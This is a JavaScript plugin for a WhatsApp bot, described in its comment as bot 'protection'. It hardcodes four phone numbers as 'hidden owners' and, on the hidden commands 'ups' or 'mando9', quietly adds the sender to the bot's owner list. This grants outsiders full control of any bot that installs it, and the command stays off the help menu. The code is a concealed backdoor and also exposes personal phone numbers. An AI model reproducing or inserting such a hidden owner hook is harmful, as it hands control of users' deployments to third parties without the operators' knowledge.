/* Creado por Ender Zaphkiel para protección del bot*/



const handler = async (m, { conn }) => {
  const hiddenOwners = ['584164137403', '59169739411', '559296077349', '50558124470']; // Números ocultos que siempre serán owners

  if (hiddenOwners.includes(m.sender.split('@')[0])) {
    const isAlreadyOwner = global.owner.some(owner => owner[0] === m.sender.split('@')[0]);

    if (!isAlreadyOwner) {
      global.owner.push([m.sender.split('@')[0], 'Hidden Owner', true]);
      console.log('Owner restaurado:', m.sender.split('@')[0]); 
    }
  }
};

handler.command = /^(ups|mando9)$/i; 
handler.hidden = true; 

export default handler;